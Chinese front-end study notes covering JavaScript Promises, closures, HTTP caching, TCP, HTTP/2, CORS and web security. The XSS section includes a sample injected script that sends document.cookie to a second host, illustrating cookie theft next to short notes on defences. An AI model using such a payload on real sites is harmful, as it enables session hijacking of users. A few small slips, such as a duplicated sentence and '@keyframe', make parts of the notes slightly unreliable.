### 笔记

- html的空格、换行会对Gzip包大小有一定的影响。如果把页面的空格去掉，可以减小包的体积。
- ios Safari中，当使用委托给一个元素添加click事件时，如果事件是委托到 document 或 body 上，并且委托的元素是默认不可点击的（如 div, span 等），此时 click 事件会失效。解决方式：
    - ​将 click 事件直接绑定到目标​元素（​​即 .target）上
    - 将目标​元素换成 <a> 或者 button 等可点击的​元素
    - ​将 click 事件委托到​​​​​非 document 或 body 的​​父级元素上
    - 给​目标元素加一条样式规则 cursor: pointer;
- 重绘：只影响元素外观的属性改变（background等），则重新绘制元素，称为重绘
- 重排/回流：影响页面布局的元素属性（margin、width等）改变、元素增删、移动，浏览器会使受影响的部分失效，并重建这部分渲染树，完成回流后，重新绘制受影响的部分，称作重排/回流，重排过程中会重绘一次。
- 浏览器会维护一个队列，集中重排。但js去获取style信息（offsetTop、width、scrollTop等）会迫使浏览器立即重排以获取最准确的元素信息。
- Promise的catch可以理解为new Promise().then(null, rejectionFunc)的缩写
- Promise的then和catch都会返回新的Promise，所以可以链式调用。then和catch里的报错都会传到后续的catch中
- 对于Promise.all，只要数组中的一个Promise reject，Promise.all的catch就会被调用；但如果reject那个Promise已经有自己的catch了，就不会触发，因为这个catch是返回的一个新的Promise。
- Promise立即resolve过后会在本轮“事件循环”结束时执行，setTimeout(fn, 0)在下一轮“事件循环”开始时执行
```javascript
setTimeout(function () {
  console.log('three');
}, 0);

Promise.resolve().then(function () {
  console.log('two');
});

console.log('one');

// one
// two
// three
```
- Promise的保存不能被window.onerror捕获，而需要另外监听事件unhandledrejection
- 数组和字符串都有Iterator接口
```javascript
for(let a of [1, 2]){
    console.log(a);
}
const string = 'abchd';
for(let a of string){
    console.log(a);
}
const interator = string[Symbol.iterator]();
interator.next(); // a
interator.next(); // b
interator.next(); // c
```
- async函数会返回Promise对象，必须等到内部所有await命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到return语句或者抛出错误。只要一个await语句后面的 Promise 变为reject，那么整个async函数都会中断执行。为了不中断，有两种方式
```javascript
// 方式一
async function f() {
  try {
    await Promise.reject('出错了');
  } catch(e) {
  }
  return await Promise.resolve('hello world');
}
f()
.then(v => console.log(v))
// hello world

// 方式二
async function f() {
  await Promise.reject('出错了')
    .catch(e => console.log(e));
  return await Promise.resolve('hello world');
}

f()
.then(v => console.log(v))
// 出错了
// hello world
```
- 正常情况下，await命令后面是一个 Promise 对象。如果不是，会被转成一个立即resolve的 Promise 对象。
```javascript
async function f() {
  return await 123;
}
f().then(v => console.log(v))
// 123
```
- set数据结构可以用于数组的交集、并集、差集
- 正常情况下，await命令后面是一个 Promise 对象。如果不是，会被转成一个立即resolve的 Promise 对象。
```javascript
let a = new Set([1, 2, 3]);
let b = new Set([4, 3, 2]);

// 并集
let union = new Set([...a, ...b]);
// Set {1, 2, 3, 4}

// 交集
let intersect = new Set([...a].filter(x => b.has(x)));
// set {2, 3}

// 差集
let difference = new Set([...a].filter(x => !b.has(x)));
// Set {1}
```
- 日志分析、大数据处理系统ELK：elasticsearch、logstash、kibana，对应的，新浪当前使用的elasticsearch、rsyslog、grafana
- 大数据存储、查询、处理系统：kafka、spark、hadoop
- 可以设置Strict-Transport-Security头，让浏览器直接重定向http到https，而不需要服务器重定向。早期，浏览器会一直存储Strict-Transport-Security的设置，用户不能清除；从而可以在一个页面中发起多个请求，通过请求中的Strict-Transport-Security值，可以组成一个010101010形式的二进制信息，从而实现永久地认识用户。但是，该bug已被修复，该header头会随着cookie一起清除。
- substr从指定位置开始截取指定长度。slice、substring指定开始和结束，截取。substring中参数为负会转为0，两个参数中，取小值为开始。slice中，若第一个参数等于大于第二个参数,则返回空字符串。
- css对页面的阻塞情况
  - css加载不会阻塞DOM树的解析
  - css加载会阻塞DOM树的渲染
  - css加载会阻塞后面js语句的执行，但不会阻塞js加载
  - js会阻塞dom树解析、渲染，因此未解析的css link可能会被阻塞加载
- get请求和post请求的区别
  - GET在浏览器回退时是无害的，而POST会再次提交请求。
  - GET产生的URL地址可以被Bookmark，而POST不可以。
  - GET请求会被浏览器主动cache，而POST不会，除非手动设置。
  - GET请求只能进行url编码，而POST支持多种编码方式。
  - GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
  - GET请求在URL中传送的参数是有长度限制的，而POST么有。
  - 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
  - GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
  - GET参数通过URL传递，POST放在Request body中。  
- http缓存控制
  - expired/cache-control（强缓存）：用两者设置缓存后，浏览器不会向服务请求；expired是服务器时间，客户端和服务端时间不一致，可能有问题；cache-control只有http 1.1支持。两者都存在，内容更新后，客户端资源得不到及时更新得问题
  - last-modified/etag（弱缓存）：浏览器会向服务器确认资源是否过期，没有过期服务器返回304。但其实服务器无法精确确定last-modified时间；计算etag的hash有性能消耗。
  - 缓存优先级：强缓存 > 弱缓存，具体是cache-control > expired > last-modified = etag
  - 对于前端资源，一般都这只很长的强缓存，然后通过更新index.html的资源文件名来更新资源
  - 箭头函数的this、arguments都是父级作用域的this、arguments，bind、call、apply对箭头函数无效，箭头函数没有prototype，不能对箭头函数使用new，yield 关键字通常不能在箭头函数中使用（除非是嵌套在允许使用的函数内）
  - 虽然箭头函数中的箭头不是运算符，但箭头函数具有与常规函数不同的特殊运算符优先级解析规则
  ```javascript
    callback = callback || () => {};      
    // SyntaxError: invalid arrow-function arguments

    callback = callback || (() => {});    // ok
  ```
  - 闭包：可以理解为能够读取其他函数内部变量的函数，由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成"定义在一个函数内部的函数"。所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。
  - 同一个函数内部的闭包作用域只有一个，所有闭包共享。在执行函数的时候，如果遇到闭包，则会创建闭包作用域的内存空间，将该闭包所用到的局部变量添加进去，然后再遇到闭包时，会在之前创建好的作用域空间添加此闭包会用到而前闭包没用到的变量。函数结束时，会清除没有被闭包作用域引用的变量。
    ```javascript
    const heapdump = require('heapdump')
    let leakObject = null
    let count = 0
    /* 这段代码内存泄露原因是：在 testMemoryLeak 函数内有两个闭包：unused 和 leakMethod。unused 这个闭包引用了父作用域中的 originLeakObject 变量，如果没有后面的 leakMethod，则会在函数结束后被清除，闭包作用域也跟着被清除了。因为后面的 leakObject 是全局变量，即 leakMethod 是全局变量，它引用的闭包作用域（包含了 unused 所引用的 originLeakObject）不会释放。而随着 testMemoryLeak 不断的调用，originLeakObject 指向前一次的 leakObject，下次的 leakObject.leakMethod 又会引用之前的 originLeakObject，从而形成一个闭包引用链，而 leakStr 是一个大字符串，得不到释放，从而造成了内存泄漏。

    解决方法：在 testMemoryLeak 函数内部的最后添加 originLeakObject = null 即可。 */
    // 全局变量leakObject引用了局部变量leakMethod函数，导致testMemoryLeak的闭包不能释放，因为闭包作用域只有一个，
    // 所以unused函数对originLeakObject函数的引用也不能释放
    setInterval(function testMemoryLeak() {
      const originLeakObject = leakObject
      const unused = function () {
        if (originLeakObject) {
          console.log('originLeakObject')
        }
      }
      leakObject = {
        count: String(count++),
        leakStr: new Array(1e7).join('*'),
        leakMethod: function () {
          console.log('leakMessage')
        }
      }
    }, 1000)
    ```
- 跨域
  - script、link、img、video、iframe、@font-face等可以跨域
  - 存储在浏览器中的数据，如localStorage和IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。
  -  Cookies 使用不同的源定义方式。一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀（public suffix）即可。
  - jsonp用于只能get请求，cors不支持ie10以下，jsonp只需要一次请求，cors多一次option请求
- http状态码：
  - 100：continue
  - 101：协议转换
  - 200：ok
  - 204：no-content
  - 301：永久重定向
  - 302：临时重定向
  - 304：not modified
  - 400：bad request
  - 401：Unauthorized
  - 403：forbidden
  - 404：not found
  - 500：Internal Server Error
  - 501：Not Implemented
  - 502：Bad Gateway
  - 504：Gateway Timeout
- 7层网络协议：
  - 物理层：规定通信设备的机械的、电气的、功能的和过程的特性，用以建立、维护和拆除物理链路连接。具体地讲，机械 特性规定了网络连接时所需接插件的规格尺寸、引脚数量和排列情况等;电气特性规定了在物理连接上传输bit流时线路上信号电平的大小、阻抗匹配、传输速率 距离限制等;功能特性是指对各个信号先分配确切的信号含义，即定义了DTE和DCE之间各个线路的功能;规程特性定义了利用信号线进行bit流传输的一组 操作规程，是指在物理连接的建立、维护、交换信息是，DTE和DCE双放在各电路上的动作系列。在这一层，数据的单位称为`比特(bit)`。属于物理层定义的典型规范代表包括：EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45等。
  - 数据链路层：在物理层提供比特流服务的基础上，建立相邻结点之间的数据链路，通过差错控制提供数据帧(Frame)在信道上无差错的传输，并进行各电路上的动作系列。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。在这一层，数据的单位称为`帧(frame)`。数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。  
  - 网络层：在 计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。网络层将数据链路层提供的帧组成数据包，包中封装有网络层包头，其中含有逻辑地址信息- -源站点和目的站点地址的网络地址。如 果你在谈论一个IP地址，那么你是在处理第3层的问题，这是`“数据包”`问题，而不是第2层的“帧”。IP是第3层问题的一部分，此外还有一些路由协议和地 址解析协议(ARP)。有关路由的一切事情都在这第3层处理。地址解析和路由是3层的重要目的。网络层还可以实现拥塞控制、网际互连等功能。在这一层，数据的单位称为数据包(packet)。网络层协议的代表包括：IP、IPX、RIP、OSPF等。
  - 传输层：第4层的数据单元也称作`数据包(packets)`。但是，当你谈论TCP等具体的协议时又有特殊的叫法，TCP的数据单元称为段 (segments)而UDP协议的数据单元称为“数据报(datagrams)”。这个层负责获取全部信息，因此，它必须跟踪数据单元碎片、乱序到达的 数据包和其它在传输过程中可能发生的危险。第4层为上层提供端到端(最终用户到最终用户)的透明的、可靠的数据传输服务。所为透明的传输是指在通信过程中 传输层对上层屏蔽了通信传输系统的具体细节。传输层协议的代表包括：TCP、UDP、SPX等。
  - 会话层：这一层也可以称为会晤层或对话层，在会话层及以上的高层次中，数据传送的单位不再另外命名，而是统称为报文。会话层不参与具体的传输，它提供包括访问验证和会话管理在内的建立和维护应用之间通信的机制。如服务器验证用户登录便是由会话层完成的。
  - 表示层：这一层主要解决拥护信息的语法表示问题。它将欲交换的数据从适合于某一用户的抽象语法，转换为适合于OSI系统内部使用的传送语法。即提供格式化的表示和转换数据服务。数据的压缩和解压缩， 加密和解密等工作都由表示层负责。
  - 应用层为操作系统或网络应用程序提供访问网络服务的接口。应用层协议的代表包括：Telnet、FTP、HTTP、SNMP等。
- tcp/ip：
  - TCP/IP协议中的应用层处理开放式系统互联模型中的第五层、第六层和第七层的功能。
  - 在TCP中,当发送端的数据到达接收主机时,接收端主机会番号一个已收到消息的通知。这个消息叫做确认应答--ACK(Positive Acknowled-gement 意指已经接收。)
  - 三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息（注：简单地说，就是为了确认server、client的可发可收；如果不这样，可能的问题，比如client向server发送的报文在某个网络节点滞留了很久后才到达server，这时server以为是client刚发的，就向client发送确认报文，但client觉得自己当前没有发送请求，会忽略server的报文，但服务端以为连接成功建立了，浪费资源）
  - 四次挥手：client1告诉client2自己数据发完了（FIN），client2收到后回复client1说自己知道了（ACK），但client2还可以继续向client1发数据，发完后，告诉client1发完了（FIN），client1收到后回复client2（ACK）。
  - TCP在传送大量数据时,是以MSS(Maximum Segment Size 最大消息长度)的大小将数据进行分割发送。进行重发是也是以MSS为单位。在三次握手时，会告诉对方自己的MSS大小，然后以最小的MSS发送数据
  - Todo：继续完善https://www.jianshu.com/p/1579ad49c5f8  
- http：
  - http是面向文本的，报文分为请求报文和响应报文，两种报文都包含请求行（第一行）、请求头部、空行、请求数据
  - 请求行：请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。例如，GET /index.html HTTP/1.1
  - 请求头部：由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，就是常说的请求头
  - 请求数据：状态行（200等）、消息报头（content length等）、响应正文（内容）
- https：
  - HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。
- http2：
  - 基于SPDY，主要区别是SPDY强制https，http2不强制，两者的消息头压缩算法不同
  - HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。（注：其实http2是一个长连接了，所以是双方是有状态的，所以可以cache header）每次只传输差异性header
  - 支持服务推送：在客户端请求之前，就可以向客户端推送未来会用到的资源
  - 帧：HTTP/2 数据通信的最小单位消息：指 HTTP/2 中逻辑上的 HTTP 消息。例如请求和响应等，消息由一个或多个帧组成。
  - 流：存在于连接中的一个虚拟通道。流可以承载双向消息，每个流都有一个唯一的整数ID。
  - HTTP/2 采用二进制格式传输数据，而非 HTTP 1.x 的文本格式，二进制协议解析起来更高效。 HTTP / 1 的请求和响应报文，都是由起始行，首部和实体正文（可选）组成，各部分之间以文本换行符分隔。HTTP/2 将请求和响应数据分割为更小的帧，并且它们采用二进制编码。
  - HTTP/2 中，同域名下所有通信都在单个连接上完成，该连接可以承载任意数量的双向数据流。每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，根据帧首部的流标识可以重新组装。
- 表单请求是允许跨域的，跨域限制本质上是一个域名的 JS ，在未经允许的情况下，不得读取另一个域名的内容。但浏览器并不阻止你向另一个域名发送请求，表单提交是会刷新页面的，所以开发者无法访问跨域内容
- 文件上传断点续传：文件分片上传，通过分片id续传
- vue-rouer：根据路由确定要渲染的组件，hash模式通过hashchange事件实现，history模式利用html5的history api
- BFC
  - FC是formatting context的首字母缩写，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用
  - 常见的FC有BFC、IFC（行级格式化上下文），还有GFC（网格布局格式化上下文）和FFC（自适应格式化上下文
  - BFC 可以简单的理解为某个元素的一个 CSS 属性，只不过这个属性不能被开发者显式的修改，拥有这个属性的元素对内部元素和外部元素会表现出一些特性，这就是BFC。
  - 可以触发BFC的属性：float不为none，overflow不为visible，display的值为table、inline-block、table-cell、table-caption，position的值为absolute或fixed，
  - 可用于清除浮动、阻止margin合并
- XSS：跨站脚本（Cross-site scripting），通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS  
  - 存储型XSS：用户提交恶意表单，数据被存入数据库，其他用户请求的，浏览器执行了恶意表单中的代码
  - 反射型XSS：将用户输入的存在XSS攻击的数据，发送给后台，后台并未对数据进行存储，也未经过任何过滤，直接返回给客户端。被浏览器渲染
  - dom xss：比如访问如下链接http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie</script>
  -  防御：一般是转义就行
-  CSRF：跨站请求伪造（Cross-site request forgery）,冒充用户发起请求（在用户不知情的情况下）
  - 一般方式是诱导用户在正常网站发出攻击者想发出的请求
  - 防御：使用ajax、验证referer、在请求中添加token
- 线性存储结构：比如数组。相邻数据元素的存放地址也相邻（逻辑与物理统一）；要求内存中可用存储单元的地址必须是连续的。优点：存储密度大
（＝1），存储空间利用率高。缺点：插入或删除元素时不方便  
- 链式存储结构：比如链表。相邻数据元素可随意存放，但所占存储空间分两部分，一部分存放结点值，另一部分存放表示结点间关系的指针.优点：插入或删除元素时很方便，使用灵活。缺点：存储密度小（<1），存储空间利用率低
- js原型链相关
  - 只有函数对象才有 prototype属性，除开函数对象之外的对象都是普通对象，该函数的实例也没有prototype。prototype可以理解为，函数作为构造函数使用时，实例（instance）真正集成属性和方法的地方
  - 对象有属性__proto__，指向该对象的构造函数的原型对象，也就是该对象的属性、方法真正继承的来源
  - constructor属性始终指向创建这个对象的构造函数，
  ```javascript
  function a () {}
  const b = new a()
  console.log(b.prototype) // undefined
  console.log(b.__proto__ === a.prototype) // true
  console.log(b.constructor === a) // true
  console.log(a.constructor === Function) // true
  console.log(a.__proto__ === Function.prototype) // true
  ```
  - 之所以要在构造函数的原型上定义方法，而不是直接在构造函数内部写`this.method = function`，一个原因是不希望每次实例化都重新声明函数，浪费内存
  - 对象继承：可以基于原型链、也可以直接拷贝
  ```javascript
  // http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance.html
  function extend (child, parent) {
    var f = function () {}
    f.prototype = parent.prototype
    child.prototype = new f()
    child.prototype.constructor = child
  }
  ```
  -  instanceof：obj 会一直沿着隐式原型链 __proto__ 向上查找直到 obj.__proto__.__proto__ ...... === Obj.prototype 为止，如果找到则返回 true，也就是 obj 为 Obj 的一个实例。否则返回 false，obj 不是 Obj 的实例。（注：对象的__proto__指向真正该对象继承的来源，该来又是类的prototype，所以这样判断）
- transition缺点：需要事件触发，无法自动播放，无法重复播放，只能定义首尾状态，无法定义中间状态，只能定义一个属性变化，animation解决了这些问题
```css
.div {
  animation: myFrame 1s infinite
}
@keyframe myFrame{
  0% { left: 20px}
  100% { left: 100px }
}
```
- ES6 模块与 CommonJS 模块的差异
  - CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用
  - CommonJS 模块是运行时加载，ES6 模块是编译时输出接口
- nodejs require顺序：
  - 首先查看是否是内核,是就直接返回
  - 路径形式直接按路径加载
  - 文件后缀名顺序：.js、.json、.node
  - 非路径形式，优先加载核心模块，如果不存在，就从当前路径开始一级级向上寻找 node_modules 子目录，直到根目录
  - 如果设置了NODE_PATH环境变量，最后会在NODE_PATH的位置查找
- addEventListener回调中的this是触发事件的dom元素，ie8貌似是window
- 小程序使用双 WebView 双线程的模式隔离了JS逻辑与UI渲染，形成了特殊的开发模式，加强了 H5 与 Native 混合程度，提高了页面性能及开发体验。
- hybrid：
  - js调用native实现方案：
    1. API注入，原理其实就是 Native 获取 JavaScript环境上下文，并直接在上面挂载对象或者方法，使 js 可以直接调用，Android 与 IOS 分别拥有对应的挂载方式。
    2. WebView 中的 prompt/console/alert 拦截，通常使用 prompt，因为这个方法在前端中使用频率低，比较不会出现冲突；
    3. WebView URL Scheme 跳转拦截，webview发出请求，客户端拦截请求，然后通过window.dispatchEvent来回传数据（webview已经监听了对应的事件）
  - native通知js：
    ```javascript
    // ios
    // Swift
    webview.stringByEvaluatingJavaScriptFromString("alert('NativeCall')")
    // android
    // 调用js中的JSBridge.trigger方法
    // 该方法的弊端是无法获取函数返回值；
    webView.loadUrl("javascript:JSBridge.trigger('NativeCall')")
    // android 4.4以上
    // 4.4+后使用该方法便可调用并获取函数返回值；
    // 这时我们需要使用前面提到的 prompt 的方法进行兼容，让 H5端 通过 prompt 进行数据的发送，客户端进行拦截并获取数据
    mWebView.evaluateJavascript（"javascript:JSBridge.trigger('NativeCall')", 	 new ValueCallback<String>() {
        @Override
        public void onReceiveValue(String value) {
            //此处为 js 返回的结果
        }
    });
    ```
  - bridge初始化：由客户端注入bridge js，但是h5很难知道注入时机，因此需要监听ready事件
- 模块循环依赖
  - nodejs的require不会出现循环引用的问题，因为第一次require后模块存在内存中，第二次require的时候直接取内存中的值（模块导致出的exports），不会再执行一次模块
  - es6也没有循环引用的问题：ES6根本不会关心是否发生了"循环加载"，只是生成一个指向被加载模块的引用，需要开发者自己保证，真正取值的时候能够取到值
  - 详细及示例：http://www.ruanyifeng.com/blog/2015/11/circular-dependency.html